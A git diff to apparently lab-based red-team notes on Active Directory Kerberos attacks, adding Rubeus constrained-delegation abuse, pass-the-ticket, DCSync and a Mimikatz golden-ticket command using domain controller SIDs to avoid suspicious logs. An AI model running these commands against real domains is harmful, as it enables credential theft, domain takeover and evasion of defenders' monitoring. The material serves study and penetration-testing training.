@@ -259,7 +259,7 @@ If any interesting ticket is located on the server, we will need to wait until a
 Invoke-UserHunter -ComputerName srv01 -Poll 100 -UserName Administrator -Delay 5 -Verbose
 ```
 
-If we find a interesting ticket, it could be reused using _PassTheTicket_:
+If we find a interesting ticket, it could be reused using _Pass-The-Ticket_:
 
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
@@ -322,7 +322,7 @@ To impersonate the user, Service for user as known as `S4U` extension is used wh
 * **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service on behalf of a user. The attribute `msDS-AllowedToDelegate` attribute contains a list of SPNs to which the user tokens can be forwarded.
 
 
-To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the web service account as any user.
+To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible /to access the services listed in `msDS-AllowedToDelegateTo` of the web service account as any user.
 
 * PowerView Dev:
 ```powershell
@@ -359,7 +359,7 @@ So we can ask for other service on a machine, in case of having Constrained dele
 
 * Rubeus
 
-```
+```powerhsell
 .\Rubeus.exe asktgt /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /outfile:ADMINSRV-TGT.kirbi
 
 .\Rubeus.exe s4u /ticket:ADMINSRV-TGT.kirbi /impersonateuser:Administrator /outfile:Administrator-TGS
@@ -370,6 +370,11 @@ tfile:LDAP-Administrator
 .\Rubeus.exe ptt /ticket:LDAP-Administrator_LDAP-dcorp-dc.dollarcorp.moneycorp.local
 
 Invoke-Mimikatz -Command '"lsadump::dcsyinc /user:dcorp\Administrator"'
+```
+To abuse constrained delegation with Rubeus and request a TGT and TGS in a single command:
+
+```powershell
+.\rubeus.exe s4u /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.local" /altservice:LDAP /ptt
 ```
 
 ## Mitigation
@@ -529,3 +534,18 @@ Once created we can import and we don't need to ask for a TGS.
 
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
 ```
+
+Avoid Suspicious logs by using DC machine accounts.
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-41456871508-1792461683 /groups:516 /sids:S-1-5-21-560323961-2032768757-2425134131-516,S-1-5-9 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ptt"'
+```
+
+> **RedTeam Notes:** Avoid suspicious logs adding
+>
+> `/groups:516`
+> `/sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9`
+>
+> S-1-5-21-280534878-1496970234-700767426-516 - Domain Controllers
+> S-1-5-9 - Enterprise Domain Controllers
+
